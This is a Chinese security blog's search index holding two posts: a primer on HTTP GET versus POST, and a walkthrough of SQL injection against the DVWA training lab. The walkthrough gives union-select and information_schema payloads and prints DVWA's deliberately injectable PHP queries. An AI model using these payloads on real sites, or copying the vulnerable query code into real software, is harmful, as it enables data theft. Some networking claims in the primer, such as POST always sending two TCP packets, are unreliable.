<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>GET方法与POST方法</title>
    <url>/2023/04/21/GET%E6%96%B9%E6%B3%95%E4%B8%8EPOST%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="什么是-HTTP-协议"><a href="#什么是-HTTP-协议" class="headerlink" title="什么是 HTTP 协议"></a>什么是 HTTP 协议</h1><p>协议是指计算机通信网络中两台计算机之间进行通信所必须共同遵守的规定或规则，超文本传输协议 (HTTP) 是一种通信协议，它允许将超文本标记语言 (HTML) 文档从 Web 服务器传送到客户端的浏览器</p>
<h1 id="网页请求流程"><a href="#网页请求流程" class="headerlink" title="网页请求流程"></a>网页请求流程</h1><p>当我们打开浏览器，在地址栏中输入 URL，然后我们就看到了网页。 原理是怎样的呢？</p>
<p>实际上我们输入 URL 后，我们的浏览器给 Web 服务器发送了一个 Request, Web 服务器接到 Request 后进行处理，生成相应的 Response，然后发送给浏览器， 浏览器解析 Response 中的 HTML, 这样我们就看到了网页</p>
<h1 id="打开一个网页需要浏览器发送很多次-Request"><a href="#打开一个网页需要浏览器发送很多次-Request" class="headerlink" title="打开一个网页需要浏览器发送很多次 Request"></a>打开一个网页需要浏览器发送很多次 Request</h1><ol>
<li><p>当你在浏览器输入 URL <a href="http://www.bing.com/">http://www.bing.com</a> 的时候，浏览器发送一个 Request 去获取 <a href="http://www.bing.com/">http://www.bing.com</a> 的 html.  服务器把 Response 发送回给浏览器.</p>
</li>
<li><p>浏览器分析 Response 中的 HTML，发现其中引用了很多其他文件，比如图片，CSS 文件，JS 文件。</p>
</li>
<li><p>浏览器会自动再次发送 Request 去获取图片，CSS 文件，或者 JS 文件。</p>
</li>
<li><p>等所有的文件都下载成功后。 网页就被显示出来了。</p>
</li>
</ol>
<h1 id="网页请求方法"><a href="#网页请求方法" class="headerlink" title="网页请求方法"></a>网页请求方法</h1><p>Http 协议定义了很多与服务器交互的方法，最基本的有 4 种，分别是GET,POST,PUT,DELETE.一个 URL 地址用于描述一个网络上的资源，而 HTTP 中的 GET, POST, PUT, DELETE 就对应着对这个资源的查，改，增，删 4 个操作。 我们最常见的就是 GET 和 POST 了。GET 一般用于获取 &#x2F; 查询资源信息，而 POST 一般用于更新资源信息。</p>
<p><img src="https://www.runoob.com/wp-content/uploads/2013/07/get-post.png"></p>
<h1 id="GET和POST方法的区别"><a href="#GET和POST方法的区别" class="headerlink" title="GET和POST方法的区别"></a>GET和POST方法的区别</h1><p>我们看看 GET 和 POST 的区别</p>
<ol>
<li><p>GET 提交的数据会放在 URL 之后，以? 分割 URL 和传输数据，参数之间以 &amp; 相连，如 EditPosts.aspx?name&#x3D;test1&amp;id&#x3D;123456.  POST 方法是把提交的数据放在 HTTP 包的 Body 中，不会在URL中显示参数。</p>
</li>
<li><p>GET 提交的数据大小有限制（因为浏览器对 URL 的长度有限制），而 POST 方法提交的数据没有限制。</p>
</li>
<li><p>GET 方式需要使用 Request.QueryString 来取得变量的值，而 POST 方式通过 Request.Form 来获取变量的值。</p>
</li>
<li><p>GET 方式提交数据，会带来安全问题，比如一个登录页面，通过 GET 方式提交数据时，用户名和密码将出现在 URL 上，如果页面可以被缓存或者其他人可以访问这台机器，就可以从历史记录获得该用户的账号和密码。</p>
</li>
<li><p>GET产生一个TCP数据包，浏览器会把http header和data一并发出去，服务器响应200（返回数据），POST产生2个TCP数据包，浏览器先发送header，服务器响应100（continue），浏览器再发生data，服务器响应200（返回数据）</p>
</li>
</ol>
<table>
<thead>
<tr>
<th></th>
<th>GET</th>
<th>POST</th>
</tr>
</thead>
<tbody><tr>
<td>后退按钮&#x2F;刷新</td>
<td>无害</td>
<td>数据会被重新提交（浏览器应该告知用户数据会被重新提交）。</td>
</tr>
<tr>
<td>书签</td>
<td>可收藏为书签</td>
<td>不可收藏为书签</td>
</tr>
<tr>
<td>缓存</td>
<td>能被缓存</td>
<td>不能缓存</td>
</tr>
<tr>
<td>编码类型</td>
<td>application&#x2F;x-www-form-urlencoded</td>
<td>application&#x2F;x-www-form-urlencoded or multipart&#x2F;form-data。为二进制数据使用多重编码。</td>
</tr>
<tr>
<td>历史</td>
<td>参数保留在浏览器历史中。</td>
<td>参数不会保存在浏览器历史中。</td>
</tr>
<tr>
<td>对数据长度的限制</td>
<td>是的。当发送数据时，GET 方法向 URL 添加数据；URL 的长度是受限制的（URL 的最大长度是 2048 个字符）。</td>
<td>无限制。</td>
</tr>
<tr>
<td>对数据类型的限制</td>
<td>只允许 ASCII 字符。</td>
<td>没有限制。也允许二进制数据。</td>
</tr>
<tr>
<td>安全性</td>
<td>与 POST 相比，GET 的安全性较差，因为所发送的数据是 URL 的一部分。在发送密码或其他敏感信息时绝不要使用 GET ！</td>
<td>POST 比 GET 更安全，因为参数不会被保存在浏览器历史或 web 服务器日志中。</td>
</tr>
<tr>
<td>可见性</td>
<td>数据在 URL 中对所有人都是可见的。</td>
<td>数据不会显示在 URL 中。</td>
</tr>
</tbody></table>
<h1 id="HTTP协议是无状态的"><a href="#HTTP协议是无状态的" class="headerlink" title="HTTP协议是无状态的"></a>HTTP协议是无状态的</h1><p>http协议是无状态的，同一个客户端的这次请求和上次请求是没有对应关系，对http服务器来说，它并不知道这两个请求来自同一个客户端。 为了解决这个问题， Web程序引入了Cookie机制来维护状态。</p>
<h1 id="HTTP协议是无状态的和Connection-keep-alive的区别"><a href="#HTTP协议是无状态的和Connection-keep-alive的区别" class="headerlink" title="HTTP协议是无状态的和Connection: keep-alive的区别"></a>HTTP协议是无状态的和Connection: keep-alive的区别</h1><p>无状态是指协议对于事务处理没有记忆能力，服务器不知道客户端是什么状态。从另一方面讲，打开一个服务器上的网页和你之前打开这个服务器上的网页之间没有任何联系</p>
<p>HTTP是一个无状态的面向连接的协议，无状态不代表HTTP不能保持TCP连接，更不能代表HTTP使用的是UDP协议（无连接）</p>
<p>从HTTP&#x2F;1.1起，默认都开启了Keep-Alive，保持连接特性，简单地说，当一个网页打开完成后，客户端和服务器之间用于传输HTTP数据的TCP连接不会关闭，如果客户端再次访问这个服务器上的网页，会继续使用这一条已经建立的连接</p>
<p> Keep-Alive不会永久保持连接，它有一个保持时间，可以在不同的服务器软件（如Apache）中设定这个时间</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Web基础</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入实战之DVWA</title>
    <url>/2023/04/13/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E4%B9%8BDVWA-%E4%B8%80/</url>
    <content><![CDATA[<h1 id="SQL-Injections-LOW"><a href="#SQL-Injections-LOW" class="headerlink" title="SQL Injections(LOW)"></a>SQL Injections(LOW)</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这一关是一个输入框，存在一个可控变量id，输入id回显first name以及surname</p>
<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304132115732.png" title alt data-align="center">

<h2 id="注入点分析"><a href="#注入点分析" class="headerlink" title="注入点分析"></a>注入点分析</h2><p>输入数字1~5回显数据库数据，输入6则为空，说明表中有6个数据。</p>
<h3 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h3><p>使用单引号判断类型：输入1’，回显sql错误：“You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’’ at line 1”，证明为字符型</p>
<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304132231041.png" title alt data-align="center">

<h2 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h2><h3 id="爆列"><a href="#爆列" class="headerlink" title="爆列"></a>爆列</h3><p>加入order by语句判断表有多少列，在order by前需要加单引号将查询语句闭合，后加#等注释符无视掉原查询语句多余的限制内容</p>
<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304132235291.png" title alt data-align="center">

<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304132235879.png" title alt data-align="center">

<p>可以判断出表有2个字段</p>
<h3 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h3><p>使用联合查询语句union select，database()函数等价当前使用的数据库，则可以通过database()查出当前的数据库</p>
<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304132237171.png" title alt data-align="center">

<h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><p>使用group_concat聚合搜索到的表名，information_schema为mysql5.0以上存在一个自带的数据库,是一个存储纪录了所有数据库名、表名、列名的数据库，也相当于可以从这里查询指定数据库下面的表名和列名的信息</p>
<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304132250607.png" title alt data-align="center">

<h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><p>使用column_name爆出表中的列，由于数据库中不止有一个users表，所以会聚合显示出所有users表中的列</p>
<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304132257274.png" title alt data-align="center">

<h3 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h3><p>使用union select 1,group_concat(column1,column2) from table爆出所需的信息</p>
<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304132302078.png" title alt data-align="center">

<h2 id="源代码："><a href="#源代码：" class="headerlink" title="源代码："></a>源代码：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_DVWA</span>[<span class="string">&#x27;SQLI_DB&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> MYSQL:</span><br><span class="line">            <span class="comment">// Check database</span></span><br><span class="line">            <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Get results</span></span><br><span class="line">            <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">                <span class="comment">// Get values</span></span><br><span class="line">                <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">                <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Feedback for end user</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SQLITE:</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$sqlite_db_connection</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#$sqlite_db_connection = new SQLite3($_DVWA[&#x27;SQLITE_DB&#x27;]);</span></span><br><span class="line">            <span class="comment">#$sqlite_db_connection-&gt;enableExceptions(true);</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">            <span class="comment">#print $query;</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="variable">$results</span> = <span class="variable">$sqlite_db_connection</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Caught exception: &#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$results</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$results</span>-&gt;<span class="title function_ invoke__">fetchArray</span>()) &#123;</span><br><span class="line">                    <span class="comment">// Get values</span></span><br><span class="line">                    <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">                    <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Feedback for end user</span></span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Error in fetch &quot;</span>.<span class="variable">$sqlite_db</span>-&gt;<span class="title function_ invoke__">lastErrorMsg</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304192100764.png"></p>
<h1 id="SQL-Injections-MEDIUM"><a href="#SQL-Injections-MEDIUM" class="headerlink" title="SQL Injections(MEDIUM)"></a>SQL Injections(MEDIUM)</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>这一关从输入框变为了下拉菜单来控制用户的输入，URL中也无可控变量。第一时间想到看一眼是否是post请求</p>
<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304132306747.png" title alt data-align="center">

<p>打开开发者工具一看，还真是post请求</p>
<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304132309427.png" title alt data-align="center">

<p>直接丢给burp suite改看能否直接修改请求体</p>
<img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304132315294.png" title alt data-align="center">

<p>可以看到能直接在请求体中执行查询语句，1&#x3D;1与1&#x3D;2返回不同的界面，加单引号出现sql报错，证明为数字型</p>
<h2 id="开始注入-1"><a href="#开始注入-1" class="headerlink" title="开始注入"></a>开始注入</h2><p>和low相同，区别仅在于需要在数据包中构造查询语句</p>
<h2 id="源代码：-1"><a href="#源代码：-1" class="headerlink" title="源代码："></a>源代码：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_DVWA</span>[<span class="string">&#x27;SQLI_DB&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> MYSQL:</span><br><span class="line">            <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Get results</span></span><br><span class="line">            <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">                <span class="comment">// Display values</span></span><br><span class="line">                <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">                <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Feedback for end user</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SQLITE:</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$sqlite_db_connection</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">            <span class="comment">#print $query;</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="variable">$results</span> = <span class="variable">$sqlite_db_connection</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Caught exception: &#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$results</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$results</span>-&gt;<span class="title function_ invoke__">fetchArray</span>()) &#123;</span><br><span class="line">                    <span class="comment">// Get values</span></span><br><span class="line">                    <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">                    <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Feedback for end user</span></span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Error in fetch &quot;</span>.<span class="variable">$sqlite_db</span>-&gt;<span class="title function_ invoke__">lastErrorMsg</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"><span class="variable">$number_of_rows</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>( <span class="variable">$result</span> )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304192103674.png"></p>
<h1 id="SQL-Injections-HIGH"><a href="#SQL-Injections-HIGH" class="headerlink" title="SQL Injections(HIGH)"></a>SQL Injections(HIGH)</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>这次加了一个额外的窗口输入需要查询的内容，看起来为额外窗口为POST请求，主界面再GET</p>
<p>尝试判断注入点类型：</p>
<p>1’ and 1&#x3D;1#</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304192110885.png"></p>
<p>1’ 1&#x3D;2#</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304192110796.png"></p>
<p>字符型注入，需要闭合，闭合字符为 ‘</p>
<h2 id="开始注入-2"><a href="#开始注入-2" class="headerlink" title="开始注入"></a>开始注入</h2><p>过程和low一样，本以为会限制一些其他的东西，比如对输入的内容做判断之类的，结果依然没有做任何限制，唯一的区别是使用了自定义报错信息。导致无法使用报错注入</p>
<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304192112818.png"></p>
<h2 id="源代码：-2"><a href="#源代码：-2" class="headerlink" title="源代码："></a>源代码：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_SESSION</span> [ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_SESSION</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_DVWA</span>[<span class="string">&#x27;SQLI_DB&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> MYSQL:</span><br><span class="line">            <span class="comment">// Check database</span></span><br><span class="line">            <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Get results</span></span><br><span class="line">            <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">                <span class="comment">// Get values</span></span><br><span class="line">                <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">                <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Feedback for end user</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);        </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SQLITE:</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$sqlite_db_connection</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">            <span class="comment">#print $query;</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="variable">$results</span> = <span class="variable">$sqlite_db_connection</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Caught exception: &#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$results</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$results</span>-&gt;<span class="title function_ invoke__">fetchArray</span>()) &#123;</span><br><span class="line">                    <span class="comment">// Get values</span></span><br><span class="line">                    <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">                    <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Feedback for end user</span></span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Error in fetch &quot;</span>.<span class="variable">$sqlite_db</span>-&gt;<span class="title function_ invoke__">lastErrorMsg</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/HYBBWuXiDiXi/Blog_Images@main/pic/202304192116180.png"></p>
<h1 id="SQL-Injections-IMPOSSIBLE"><a href="#SQL-Injections-IMPOSSIBLE" class="headerlink" title="SQL Injections(IMPOSSIBLE)"></a>SQL Injections(IMPOSSIBLE)</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>见代码审计</p>
